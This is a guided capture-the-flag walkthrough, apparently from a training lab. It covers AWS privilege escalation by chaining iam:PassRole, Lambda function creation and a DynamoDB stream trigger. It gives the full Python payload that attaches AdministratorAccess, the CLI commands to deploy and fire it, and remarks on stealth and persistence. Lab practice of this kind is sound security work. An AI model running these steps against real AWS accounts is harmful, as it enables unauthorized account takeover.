# Guided Walkthrough: Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping (DynamoDB Stream)

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user has permissions to create Lambda functions and pass privileged roles to them, combined with the ability to create event source mappings to DynamoDB streams. Unlike traditional Lambda-based privilege escalation that requires `lambda:InvokeFunction`, this technique leverages event-driven architecture to trigger execution passively.

The attacker creates a Lambda function with a privileged role attached, then connects it to a DynamoDB stream. When any data is written to the table (either by the attacker inserting a test record or by legitimate application activity), the Lambda function executes automatically with the privileged role's permissions. This makes the attack stealthier as it doesn't require direct function invocation and can piggyback on normal business operations.

This pattern is particularly dangerous in production environments where DynamoDB tables receive frequent updates from applications, microservices, or automated processes. The attacker's malicious Lambda function will execute every time the table is modified, potentially going unnoticed among legitimate Lambda invocations.

## The Challenge

You start as `pl-prod-lambda-002-to-admin-starting-user`, an IAM user with limited but carefully chosen permissions: `iam:PassRole` on the `pl-prod-lambda-002-to-admin-target-role`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`. Your goal is to gain the administrative permissions held by `pl-prod-lambda-002-to-admin-target-role`.

Notably absent from your permissions is `lambda:InvokeFunction` — the most common way to trigger Lambda-based privilege escalation. You'll need to use a different trigger mechanism.

The Terraform-created resources in play are:
- `arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-admin-starting-user` — your starting principal
- `arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role` — the target role with AdministratorAccess
- `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-admin-trigger-table` — a DynamoDB table with streams enabled

## Reconnaissance

First, confirm your identity and check what you're working with:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-admin-starting-user
```

Verify you don't already have admin access:

```bash
aws iam list-users --max-items 1
# AccessDenied -- as expected
```

Now, discover the DynamoDB table's stream ARN using your `dynamodb:DescribeTable` helpful permission:

```bash
aws dynamodb describe-table \
  --table-name pl-prod-lambda-002-to-admin-trigger-table \
  --query 'Table.LatestStreamArn' \
  --output text
# arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-admin-trigger-table/stream/{timestamp}
```

The table has streams enabled — that's your passive trigger. Any write to this table will fan out to subscribed Lambda functions.

Check what roles are available to pass. You have `iam:PassRole` on a specific role ARN, but you can also use `iam:ListRoles` if granted to explore:

```bash
aws iam get-role --role-name pl-prod-lambda-002-to-admin-target-role \
  --query 'Role.Arn' --output text
# arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role
```

## Exploitation

### Step 1: Write the malicious Lambda function

Create a Python function that will attach `AdministratorAccess` to your starting user. This code runs under the privileged target role once the Lambda is triggered:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json
import boto3
import os

def lambda_handler(event, context):
    iam = boto3.client('iam')
    target_user = os.environ.get('TARGET_USER', 'pl-prod-lambda-002-to-admin-starting-user')
    iam.attach_user_policy(
        UserName=target_user,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'statusCode': 200, 'body': f'Attached AdministratorAccess to {target_user}'}
EOF

cd /tmp && zip lambda_payload.zip lambda_function.py
```

### Step 2: Create the Lambda function with the privileged role

This is the core privilege escalation action — you use `iam:PassRole` to attach the target role as the Lambda's execution role, and `lambda:CreateFunction` to deploy your code:

```bash
aws lambda create-function \
  --function-name pl-prod-lambda-002-malicious-lambda \
  --runtime python3.11 \
  --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-admin-target-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --timeout 30 \
  --environment "Variables={TARGET_USER=pl-prod-lambda-002-to-admin-starting-user}"
```

The Lambda function now exists with admin-level execution permissions — but it hasn't run yet, and you can't directly invoke it.

### Step 3: Create the event source mapping

Connect your Lambda function to the DynamoDB stream. This is what makes the attack passive — no `lambda:InvokeFunction` needed:

```bash
STREAM_ARN=$(aws dynamodb describe-table \
  --table-name pl-prod-lambda-002-to-admin-trigger-table \
  --query 'Table.LatestStreamArn' --output text)

aws lambda create-event-source-mapping \
  --function-name pl-prod-lambda-002-malicious-lambda \
  --event-source-arn "$STREAM_ARN" \
  --starting-position LATEST
```

The mapping starts in a `Creating` state and takes up to a minute to become `Enabled`. Wait for it:

```bash
UUID=$(aws lambda list-event-source-mappings \
  --function-name pl-prod-lambda-002-malicious-lambda \
  --query 'EventSourceMappings[0].UUID' --output text)

aws lambda get-event-source-mapping --uuid "$UUID" \
  --query 'State' --output text
# Enabled
```

### Step 4: Trigger the Lambda via a DynamoDB write

Now insert a record into the table. This write propagates through the stream and triggers your Lambda function:

```bash
aws dynamodb put-item \
  --table-name pl-prod-lambda-002-to-admin-trigger-table \
  --item '{"id": {"S": "trigger-1"}}'
```

The Lambda executes asynchronously. Wait 10-15 seconds for execution and IAM policy propagation. If the first write doesn't trigger it (event source mappings can take a few more seconds to fully initialize after showing `Enabled`), insert another record and wait again.

## Verification

Check whether `AdministratorAccess` has been attached to your user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-lambda-002-to-admin-starting-user
# {
#   "AttachedPolicies": [
#     {
#       "PolicyName": "AdministratorAccess",
#       "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
#     }
#   ]
# }
```

Now confirm you have full admin access:

```bash
aws iam list-users --max-items 3 --output table
# Successfully lists IAM users -- admin access confirmed
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/lambda-002-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the combination of `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` to achieve privilege escalation without ever directly invoking a Lambda function. By attaching a privileged role to a Lambda function and wiring it to a DynamoDB stream, you created a passive execution path: the next table write triggered your malicious code, which ran with full admin permissions and attached `AdministratorAccess` to your user.

This technique is particularly insidious in real environments because the Lambda invocation shows up in CloudTrail as triggered by a DynamoDB stream event — not by a suspicious direct invocation from a low-privilege user. The attack also persists: the event source mapping remains active, so every subsequent write to the table re-executes your Lambda function.
